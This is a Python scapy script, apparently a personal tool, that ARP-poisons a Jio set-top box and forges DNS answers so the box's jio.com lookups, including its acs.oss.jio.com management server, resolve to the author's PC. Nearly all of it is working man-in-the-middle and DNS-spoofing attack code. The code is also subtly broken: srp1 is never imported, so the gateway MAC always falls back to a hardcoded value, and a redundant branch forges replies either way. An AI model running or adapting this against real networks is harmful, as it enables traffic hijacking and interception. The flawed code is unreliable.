#!/usr/bin/env python
# JioSTB plan-B: ARP-poison gateway + hijack only acs.oss.jio.com DNS to our pass_front.
# shortcut: userspace L2 relay for everything else; if the box still fails, check dnsmasq/pass_front logs first.
import time, threading, sys, datetime
from scapy.all import conf, sniff, sendp, Ether, ARP, IP, UDP, DNS, DNSRR, get_if_addr, get_if_hwaddr, AsyncSniffer

BOX_IP, BOX_MAC = "10.124.65.3", "9C:B1:DC:C7-64-AF".replace('-',':')
GW_IP  = "10.124.65.73"
PC_IP  = "10.124.65.7"

import re
def find_iface():
    from scapy.all import get_working_ifaces
    for i in get_working_ifaces():
        if PC_IP in str(i.ip):
            return i.name
    raise SystemExit("WLAN iface with "+PC_IP+" not found")

IFACE = find_iface()
PC_MAC = get_if_hwaddr(IFACE)
GATE_MUT = None
running = True

def l2p(mac): return ":".join(mac.replace('-',':').split(':'))
BOX_MAC = l2p(BOX_MAC)
def gwmac():
    try:
        ans = srp1(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=GW_IP), timeout=3, iface=IFACE, verbose=0)
        return ans.hwsrc if ans else None
    except Exception:
        return None

GW_MAC = gwmac()
if not GW_MAC:
    GW_MAC = "AE:57:63:AE:8A:1F"
print("[*] iface:", IFACE, "PC-MAC:", PC_MAC, "GW-MAC:", GW_MAC, flush=True)

def poison():
    pkt = Ether(dst=BOX_MAC, src=PC_MAC)/ARP(op=2, pdst=BOX_IP, psrc=GW_IP, hwsrc=PC_MAC)
    while running:
        sendp(pkt, iface=IFACE, verbose=0)
        time.sleep(2)

def restore():
    sendp(Ether(dst=BOX_MAC, src=GW_MAC)/ARP(op=2, pdst=BOX_IP, psrc=GW_IP, hwsrc=GW_MAC), iface=IFACE, verbose=0)
    sendp(Ether(dst=BOX_MAC, src=PC_MAC)/ARP(op=2, pdst=BOX_IP, psrc=PC_IP, hwsrc=PC_MAC), iface=IFACE, verbose=0)

def forge_dns(q):
    d = q[DNS]
    qd = d.qd
    ans = DNS(id=d.id, qr=1, aa=1, rd=1,
              question=[qd],
              an=DNSRR(rrname=qd.qname, ttl=60, rdata=PC_IP))
    pkt = Ether(dst=BOX_MAC, src=PC_MAC)/IP(src=q[IP].dst, dst=BOX_IP)/UDP(sport=q[UDP].dport, dport=q[UDP].sport)/ans
    sendp(pkt, iface=IFACE, verbose=0)
    print("[DNS] FORGED", qd.qname.decode(errors='replace'), flush=True)

def prn(p):
    if not (p.haslayer(IP) and p.haslayer(UDP) and p.haslayer(DNS)):
        return
    d = p[DNS]
    if not d.qd:
        return
    name = d.qd.qname.decode(errors='replace').lower()
    # forward-all-else path: leave box's general DNS working through the phone
    if not name.endswith("jio.com."):
        relay = Ether(dst=GW_MAC, src=PC_MAC)/bytes(p[IP])
        sendp(relay, iface=IFACE, verbose=0)
        return
    if name.startswith("acs.oss.") or name in ("jio.com.",):
        forge_dns(p)
        return
    forge_dns(p)

def main():
    global running
    # grab ublock tables only for jio-zone names -> forge answer for everything jio went asking about,
    # but only when it asks the gateway; AdGuard dns never enters this box now (we ate port 53 streams to .73)
    t = threading.Thread(target=poison, daemon=True); t.start()
    print("[*] poisoning, sniffing port53 from box... (CTRL+C to stop & unpoison)", flush=True)
    try:
        t = int(sys.argv[1]) if len(sys.argv) > 1 else None
        sniff(iface=IFACE, filter="src host %s and udp and (dst port 53 or src port %d)" % (BOX_IP, 53),
              prn=prn, store=False, timeout=t)
    except KeyboardInterrupt:
        pass
    finally:
        running = False
        restore()
        print("[!] ARP restored", flush=True)

if __name__ == "__main__":
    main()
